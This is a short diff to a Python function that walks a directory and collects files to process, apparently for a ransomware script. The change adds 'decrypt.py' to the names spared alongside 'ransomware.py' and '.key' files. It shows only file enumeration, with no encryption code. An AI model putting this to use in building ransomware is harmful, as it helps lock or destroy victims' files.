@@ -33,7 +33,7 @@ def find_files(directory):
             path = os.path.join(root, name)
 
             # Ignore key file
-            if not name.endswith(".key") and name != "ransomware.py":
+            if not name.endswith(".key") and name not in ("ransomware.py", "decrypt.py"):
                 file_list.append(path)
 
     return file_list
